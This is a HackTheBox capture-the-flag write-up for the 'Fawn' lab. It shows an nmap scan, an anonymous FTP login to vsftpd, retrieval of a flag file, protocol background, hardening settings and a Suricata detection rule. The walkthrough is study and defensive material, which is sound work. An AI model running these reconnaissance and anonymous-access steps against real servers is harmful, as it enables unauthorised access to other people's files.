# Fawn (HTB) - Anonymous FTP Access & File Exfiltration

**Platform:** HackTheBox (Starting Point) | **Target OS:** Linux (Unix / vsFTPd 3.0.3)  
**Focus:** FTP Protocol Architecture (RFC 959), Extended Passive Mode (EPSV), and Unauthenticated File Exfiltration  

---

## 🎯 Executive Summary
The "Fawn" target exposes a misconfigured File Transfer Protocol (FTP) service (`vsftpd 3.0.3`). The server was configured to allow unauthenticated `anonymous` logins, permitting arbitrary remote users to establish data channels and exfiltrate sensitive files without cryptographic or identity verification.

---

## 1. Network Reconnaissance & Service Fingerprinting

We executed a fast TCP SYN scan (`-sS`) targeting the top 100 ports to identify active perimeter services while minimizing network overhead.

```bash
$ sudo nmap -sS -sV -T4 --top-ports 100 10.129.58.249
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.129.58.249
Host is up (0.16s latency).
Not shown: 99 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```

**Technical Analysis:**
The target exposes a single open service on Port 21/TCP running `vsFTPd 3.0.3` (Very Secure FTP Daemon). While vsFTPd is engineered with security and privilege separation in mind, improper administrative configuration directives can bypass its built-in security features entirely.

---

## 2. Exploitation: Anonymous Authentication Abuse

Following standard FTP service enumeration, an initial unauthenticated session attempt failed. We then attempted an **Anonymous Login** sequence, exploiting default or permissive access rules.

```text
$ ftp 10.129.58.249
Connected to 10.129.58.249.
220 (vsFTPd 3.0.3)
Name (10.129.58.249:hacker): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||63388|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.

ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||20524|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 00:00 (0.20 KiB/s)
ftp> exit
221 Goodbye.

$ cat flag.txt
035db21c881520061c53e0536e44f815
```

---

## 3. OS Internals & Protocol Mechanics (Under the Hood)

To understand how this vulnerability functions at the network and service levels, we analyze the FTP RFC 959 state machine and vsFTPd daemon configuration.

### 1. Protocol Sequence (RFC 959 State Machine)
- **Command Channel (Port 21):** The client sends `USER anonymous`. The server responds with `331 Please specify the password.`
- **Authentication Bypass:** Sending a blank password or an arbitrary email address triggers `PASS`. The server evaluates the anonymous directive and issues a `230 Login successful` response, granting an interactive FTP control session.

### 2. Active vs. Extended Passive Mode (EPSV)
Notice the log line: `229 Entering Extended Passive Mode (|||63388|)`.
- FTP maintains two channels: a **Control Channel** (Port 21) for commands and a **Data Channel** for file transfers/directory listings.
- In **Extended Passive Mode (EPSV - RFC 2428)**, the client requests a data port. The server opens an ephemeral high-order port (e.g., `63388`), instructing the client to connect directly to that port for data transfer. This bypasses client-side NAT/firewall limitations.

### 3. Root Cause Configuration
The vulnerability stems directly from the `/etc/vsftpd.conf` configuration file on the target server:
```ini
# Critical Security Misconfiguration
anonymous_enable=YES
no_anon_password=YES
anon_root=/var/ftp
```
When `anonymous_enable` is set to `YES`, vsFTPd maps the anonymous user to a restricted system user (typically `ftp` or `nobody`) and grants access to the specified root directory without authenticating against system credentials.

---

## 4. Defensive Remediation & Detection Engineering

### 1. Hardening & Mitigation (`vsftpd.conf`)
- **Disable Anonymous Access:** Edit `/etc/vsftpd.conf` and set:
  ```ini
  anonymous_enable=NO
  ```
- **Restrict File Permissions:** If anonymous read access is strictly required for public files, ensure write/upload permissions are explicitly disabled:
  ```ini
  anon_upload_enable=NO
  anon_mkdir_write_enable=NO
  anon_other_write_enable=NO
  ```
- **Restart the Daemon:** Apply changes via `sudo systemctl restart vsftpd`.

### 2. Detection Engineering
- **Network Intrusion Detection System (Suricata/Snort):** Alert on successful anonymous FTP logins across internal subnets:
  ```text
  alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:"FTP Anonymous Login Successful"; content:"230"; content:"anonymous"; distance:0; sid:1000002; rev:1;)
  ```
- **Host Audit Logs (`/var/log/vsftpd.log`):** Monitor log files for anomalous `OK LOGIN: Client "anonymous"` events followed by file download triggers (`OK DOWNLOAD`).
